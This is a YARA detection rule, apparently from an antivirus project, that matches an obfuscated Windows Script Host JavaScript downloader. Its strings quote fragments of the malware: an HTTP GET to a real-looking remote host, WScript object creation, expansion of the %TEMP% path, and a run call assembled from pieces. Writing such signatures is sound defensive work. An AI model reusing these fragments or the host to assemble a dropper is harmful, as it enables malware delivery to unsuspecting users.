rule sig_20160428_6da88ccdb0d4c2e40a920a2c0da2eb77 {
  meta:
    description = "datamaliciousorder - file 20160428_6da88ccdb0d4c2e40a920a2c0da2eb77.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ac860dfad2fe31c510e04ddfcc4ba537a3afb87b70782701e5bc43ea942c08d1"

  strings:
    $s1  = "PcfUrzXcnJyfAcjXfjEie[KtqMqyIrlDomBiyRavGho](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function NpsZaiZboNnmHpvUqiWox() {return EojHnaTruHgtPfjXzuMah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function BnsQntIwaTfhLraLowAwy(AcuEpwQekOxvAcjUxxQay){EojHnaTruHgtPfjXzuMah[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BnsQntIwaTfhLraLowAwy(AcuEpwQekOxvAcjUxxQay){EojHnaTruHgtPfjXzuMah[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return SnjIlaZyaFvfFctMklZdi - WiqPuqCgePjgJjaAuzIjn;};" fullword ascii
    $s6  = "var EojHnaTruHgtPfjXzuMah = function BhzRkbNopHgwWxfVlkWgu() {return JtwElfUcuPojMfoDzuYey[RowWdzFyyKpyVxrUpyZjg](\"WScript\"+\"" ascii
    $s7  = "function LgrZnjNrnJmuAttGogQuy(SnjIlaZyaFvfFctMklZdi, WiqPuqCgePjgJjaAuzIjn){DzcKazXjvUqnRpuRumSyn = DzcKazXjvUqnRpuRumSyn * 1; " ascii
    $s8  = "var EojHnaTruHgtPfjXzuMah = function BhzRkbNopHgwWxfVlkWgu() {return JtwElfUcuPojMfoDzuYey[RowWdzFyyKpyVxrUpyZjg](\"WScript\"+\"" ascii
    $s9  = "var JtwElfUcuPojMfoDzuYey = this[\"WScript\"];" fullword ascii
    $s10 = "function NpsZaiZboNnmHpvUqiWox() {return EojHnaTruHgtPfjXzuMah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function ZmnJhdCzxFqvIikKefWyr(){return ZznMprZbiEgkEurRcgEwo + \"\";};" fullword ascii
    $s12 = "function LgrZnjNrnJmuAttGogQuy(SnjIlaZyaFvfFctMklZdi, WiqPuqCgePjgJjaAuzIjn){DzcKazXjvUqnRpuRumSyn = DzcKazXjvUqnRpuRumSyn * 1; " ascii
    $s13 = "if (PcfUrzXcnJyfAcjXfjEie[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function JqzFtuKobGgwMqqEeqUkn() {return ((HcjDcmEfiKwaDjyFfwVjk == true) && (HcjDcmEfiKwaDjyFfwVjk == ZbaYmnVqaYubZydUimUgt)) ?" ascii
    $s15 = "function JqzFtuKobGgwMqqEeqUkn() {return ((HcjDcmEfiKwaDjyFfwVjk == true) && (HcjDcmEfiKwaDjyFfwVjk == ZbaYmnVqaYubZydUimUgt)) ?" ascii
    $s16 = "HcjDcmEfiKwaDjyFfwVjk = true; " fullword ascii
    $s17 = "ZbaYmnVqaYubZydUimUgt = true; " fullword ascii
    $s18 = "function WofQcnPdnAawWmjLnkPbr(){return 23;};" fullword ascii
    $s19 = "function JrfIabKvlLdwKlrPyxWun()" fullword ascii
    $s20 = "var KqlKarEloZviQzaJkxVwj = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}